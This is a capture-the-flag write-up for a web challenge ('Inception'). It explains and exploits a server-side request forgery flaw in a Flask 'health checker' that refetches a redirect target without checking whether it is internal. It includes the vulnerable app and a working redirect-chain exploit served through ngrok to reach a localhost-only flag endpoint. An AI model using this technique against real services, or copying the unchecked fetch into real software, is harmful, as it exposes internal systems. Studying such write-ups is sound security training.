# Inception

```python
from flask import Flask, request, jsonify, redirect, make_response
import requests
import json

app = Flask(__name__)

users = {}
sessions = {}

MAX_REDIRECTS = 10

class TooManyRedirectsError(Exception):
    pass

STYLE = """
<style>
body {
    background-color: #000;
    color: #d4af37;
    font-family: 'Papyrus', 'Times New Roman', serif;
    text-align: center;
    margin: 0;
    padding: 0;
}
h1 {
    color: #ffd700;
    text-shadow: 0 0 10px #d4af37;
    font-size: 2.5em;
    margin-top: 50px;
}
h2 {
    color: #e6c200;
    text-shadow: 0 0 5px #b8860b;
}
form {
    background: rgba(34, 27, 0, 0.85);
    border: 2px solid #d4af37;
    border-radius: 15px;
    display: inline-block;
    padding: 30px 50px;
    margin-top: 40px;
    box-shadow: 0 0 20px #d4af37;
}
input[type=text], input[type=password] {
    background-color: #111;
    color: #d4af37;
    border: 1px solid #d4af37;
    border-radius: 5px;
    padding: 10px;
    margin: 10px;
    width: 250px;
    text-align: center;
}
input[type=submit] {
    background-color: #d4af37;
    color: black;
    border: none;
    border-radius: 5px;
    padding: 10px 25px;
    cursor: pointer;
    font-weight: bold;
}
input[type=submit]:hover {
    background-color: #ffd700;
}
a {
    color: #ffd700;
    text-decoration: none;
    font-weight: bold;
}
a:hover {
    text-decoration: underline;
}
pre {
    color: #ffeb7a;
    text-align: left;
    background: rgba(20, 15, 0, 0.8);
    padding: 20px;
    border: 1px solid #d4af37;
    border-radius: 10px;
    display: inline-block;
}
</style>
"""

@app.route('/internal/flag')
def get_internal_flag():
    if request.remote_addr != '127.0.0.1':
        return "Forbidden", 403
    return "flag{Dummy_flag_dont_submit}", 200

@app.route('/internal/error_service')
def get_internal_error():
    if request.remote_addr != '127.0.0.1':
        return "Forbidden", 403
    return "Internal Server Error in error_service", 500

@app.route('/')
def home():
    return STYLE + """
    <h1>☥ Pharaoh’s Gate ☥</h1>
    <h2>Welcome to the Enterprise Health Checker v2</h2>
    <p><a href='/login'>Login</a> | <a href='/signup'>Sign Up</a></p>
    """

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'GET':
        return STYLE + """
        <h1>Sign Up Here</h1>
        <form method="post">
            <input type="text" name="username" placeholder="username" required><br>
            <input type="password" name="password" placeholder="password" required><br>
            <input type="submit" value="Register">
        </form>
        <p><a href='/login'>Already have an account? Enter the Gate</a></p>
        """
    else:
        username = request.form.get('username')
        password = request.form.get('password')
        if username in users:
            return STYLE + "<h2>This username already exists.</h2><a href='/login'>Try logging in</a>"
        users[username] = password
        return redirect('/login')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return STYLE + """
        <h1>Login Here</h1>
        <form method="post">
            <input type="text" name="username" placeholder="Username" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <input type="submit" value="Login">
        </form>
        <p><a href='/signup'>Don’t have an account? Sign up</a></p>
        """
    else:
        username = request.form.get('username')
        password = request.form.get('password')
        if username in users and users[username] == password:
            resp = make_response(redirect('/portal'))
            sessions[username] = True
            resp.set_cookie('user', username)
            return resp
        return STYLE + "<h2>Wrong Credentials. The gods deny your entry.</h2><a href='/login'>Try again</a>"

@app.route('/portal')
def portal():
    username = request.cookies.get('user')
    if not username or username not in sessions:
        return redirect('/login')
    return STYLE + f"""
        <h1>Welcome, {username}!</h1>
        <h2>☥ Enterprise Health Checker v2 ☥</h2>
        <p>Submit a JSON file: we shall inspect its divine health.</p>
        <form action="/check" method="post">
            <input type="text" name="url" size="70" placeholder="http://example.com/health.json">
            <input type="submit" value="Check">
        </form>
        <p><a href='/logout'>Logout</a></p>
    """

@app.route('/logout')
def logout():
    username = request.cookies.get('user')
    if username in sessions:
        del sessions[username]
    resp = make_response(redirect('/'))
    resp.delete_cookie('user')
    return resp

@app.route('/check', methods=['POST'])
def check_url():
    url = request.form.get('url')
    try:
        final_response = custom_fetch(url)
        parsed_json = json.loads(final_response.text)
        return jsonify({"status": "ok", "data": parsed_json})

    except Exception as e:
        error_message = f"FATAL_ERROR: An unhandled exception occurred: {str(e)}\n\n"
        try:
            last_url = str(e).split("Last URL was: ")[1]
            final_attempt = requests.get(last_url, timeout=2)
            error_message += f"--- Final Response Body ---\n{final_attempt.text}"
        except:
            error_message += "Could not retrieve final response body."
        return STYLE + f"<pre>{error_message}</pre>", 500

def custom_fetch(url):
    current_url = url
    for i in range(MAX_REDIRECTS + 1):
        if i == MAX_REDIRECTS:
            raise TooManyRedirectsError(f"Exceeded redirect limit of {MAX_REDIRECTS}. Last URL was: {current_url}")

        response = requests.get(current_url, allow_redirects=False, timeout=3)

        if 300 <= response.status_code < 400:
            current_url = response.headers['Location']
            if current_url.startswith('/'):
                current_url = requests.compat.urljoin(response.url, current_url)
            continue
        else:
            return response
    return None

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

---

<img width="1363" height="520" alt="image" src="https://github.com/user-attachments/assets/ddb5b07c-5f35-42c1-9b4c-3389f56fc0f0" />

The victim app (given in the challenge) contains:

-   The `/portal` page receives the URL from the user and calls `/check`.

-   The `custom_fetch` function executes `requests.get(current_url, allow_redirects=False)` and manually follows the Location up to `MAX_REDIRECTS` (10).

-   When the number of redirects is exceeded, the `TooManyRedirectsError("... Last URL was: {current_url}")` exception is raised.

-   In general Exception handling, the code tries to extract `last_url` from the exception message and then does `requests.get(last_url, timeout=2)` and embeds the response body in the error page under the heading `--- Final Response Body ---`.

- There is an internal endpoint protected by the condition `request.remote_addr == '127.0.0.1'`:

```python
@app.route('/internal/flag')
def get_internal_flag():
    if request.remote_addr != '127.0.0.1':
        return "Forbidden", 403
    return "flag{Dummy_flag_dont_submit}", 200

```

The reason for the vulnerability (simplified)
----------------------------

1. The code manually tracks redirects and stores the last attempted URL (`current_url`).

2. If we exceed the limit (10), an exception containing `Last URL was: <...>` is thrown.

3. In the Exception handler, the server runs `requests.get(last_url)` **without checking** whether `last_url` is an internal address such as `127.0.0.1`, and prints the response to that request on the error page.

4. Since `/internal/flag` only responds to requests from `127.0.0.1`, we made the server itself request `http://127.0.0.1:8000/internal/flag` from within (via a series of Redirects) --- the server is able to do this because we allowed it to access an external server that will redirect it to `127.0.0.1`.

## **`exploit`**

> ### Creat **`test.py`** 

```python
from flask import Flask, redirect
app = Flask(__name__)

# عدد الـ redirects اللي هينفذها قبل ما يروح للـ final target
REDIRECT_CHAIN_LEN = 11
TARGET = "http://127.0.0.1:8000/internal/flag"

@app.route('/')
def start():
    return redirect("/r/1", code=302)

@app.route('/r/<int:n>')
def step(n):
    if n >= REDIRECT_CHAIN_LEN:
        # آخر redirect -> يوجه للـ internal flag
        return redirect(TARGET, code=302)
    # يعيد redirect إلى الخطوة التالية (مطلوب أن تكون روابط مطلقة أو نسبية مقبولة)
    return redirect(f"/r/{n+1}", code=302)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=9090)

```

```
python3 test.py
```

### 2) Detect and set up ngrok

Run ngrok to open a public URL that points to your local redirector:

```
ngrok http 9090
```

---

## put ngrok url in website 

```
https://26b4fe175d02.ngrok-free.app
```

<img width="997" height="478" alt="image" src="https://github.com/user-attachments/assets/abcfedb8-1fc1-491f-ba9c-67cb00dd190a" />

<img width="1000" height="394" alt="image" src="https://github.com/user-attachments/assets/97b9e38b-61b6-42e4-a9fc-5899e450c02b" />

<img width="1312" height="309" alt="image" src="https://github.com/user-attachments/assets/cb2e8e69-007f-4905-bcf0-898cda0224d9" />

```
CyCTF{FSdiX9L2dqaQ15PAyTWo1J1dQOpKxJwRRZ1rQD-ZCaMi0qdfeAjxN5hOvk3ka6iJ7z-NyfC6H7UrFbeNWiFpXnlxHoFiyyJN7zc}
```

